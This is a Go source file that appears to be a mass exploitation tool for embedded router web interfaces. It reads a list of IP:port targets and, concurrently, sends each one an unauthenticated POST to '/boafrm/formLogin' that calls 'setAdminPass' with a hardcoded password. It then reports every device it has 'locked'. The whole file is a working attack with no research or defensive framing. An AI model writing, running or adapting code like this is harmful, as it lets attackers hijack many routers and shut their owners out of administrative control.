package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
)

var (
	semaphore = make(chan struct{}, 5) 
)

func processIP(ipPort string, wg *sync.WaitGroup) {
	defer wg.Done()

	url := "http://" + strings.TrimSpace(ipPort) + "/boafrm/formLogin"
	payload := []byte(`{"topicurl":"setting/setAdminPass","setpass":"pbOc0419091994"}`)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return
	}

	req.Header.Set("Content-Length", fmt.Sprint(len(payload)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
	req.Header.Set("Connection", "close")

	client := &http.Client{}

	semaphore <- struct{}{} 
	resp, err := client.Do(req)
	<-semaphore 

	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	if strings.Contains(string(body), `window.location.href="/login.htm";`) {

		fmt.Printf("[T] locked: %s\n", strings.TrimSpace(ipPort))
	}
}

func main() {

	ipPorts, err := ioutil.ReadFile("ips.txt")
	if err != nil {
		fmt.Println("Error reading ips.txt:", err)
		return
	}

	ips := strings.Split(string(ipPorts), "\n")
	var wg sync.WaitGroup

	for _, ipPort := range ips {
		wg.Add(1)
		go processIP(ipPort, &wg)
	}

	wg.Wait()
}
